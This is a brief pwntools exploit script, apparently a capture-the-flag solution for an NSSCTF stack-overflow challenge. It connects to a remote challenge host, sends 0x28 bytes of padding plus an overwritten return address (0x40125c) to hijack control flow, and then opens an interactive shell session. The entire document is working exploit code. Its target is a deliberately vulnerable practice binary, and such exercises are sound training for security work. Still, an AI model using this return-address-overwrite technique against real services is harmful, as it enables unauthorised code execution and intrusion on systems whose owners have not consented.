from pwn import*

p=remote("node5.anna.nssctf.cn",28651)

#p=process('./1111有手就行的栈溢出')

payload=b'a'*(0x20+8)+p64(0x40125c)
p.sendline(payload)
p.interactive()

